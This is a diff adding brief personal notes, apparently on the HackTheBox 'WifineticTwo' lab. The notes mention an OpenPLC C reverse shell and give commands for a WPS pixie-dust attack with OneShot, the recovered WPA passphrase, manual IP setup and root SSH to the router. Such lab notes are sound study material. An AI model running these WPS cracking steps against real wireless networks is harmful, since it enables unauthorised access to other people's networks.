@@ -1,0 +1,24 @@
+Openplc
+In hardware, use C code reverse shell.
+
+We are dealing with WPS and could cope with pixie-dust or WPS brute force on the container.
+
+
+https://medium.com/@onurcangencbilkent/wifinetictwo-writeup-code-injection-hackthebox-to-be-continue-5509436b2287
+
+
+
+#iw dev wlan0 scan (to know SSID and BSSID)
+
+WPS bruteforce attack (pixie dust attack)
+-----------------------------------------
+
+https://github.com/kimocoder/OneShot/blob/master/oneshot.py?source=post_page-----33b501b69579--------------------------------(oneshot.py)
+
+#python3 one.py -i wlan0 -b 02:00:00:00:01:00 -K (to know WPS pin && WPA psk)
+#wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config (to generate WPA passphrase configuration file)
+
+Manual assign IP and netmask
+----------------------------
+#ifconfig wlan0 192.168.1.5 netmask 255.255.255.0
+#ssh root@192.168.1.1
